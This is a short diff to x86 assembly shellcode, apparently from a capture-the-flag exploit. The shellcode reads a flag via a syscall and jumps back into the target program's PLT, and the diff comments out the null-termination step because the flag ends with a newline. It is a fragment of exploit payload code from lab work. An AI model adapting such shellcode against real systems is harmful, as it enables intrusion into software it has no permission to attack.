@@ -87,12 +87,13 @@ push 32
 pop edx
 int 0x80 ; syscall
 
+; no need because flag ends with newline
 ; put null at the end of the read
-xor ebx, ebx
+;xor ebx, ebx
 ; ptr += eax
-add ecx, eax
+;add ecx, eax
 ; *ptr = 0
-mov BYTE [ecx], bl
+;mov BYTE [ecx], bl
 
 ; jmp back to plt
 push 0x080486a6
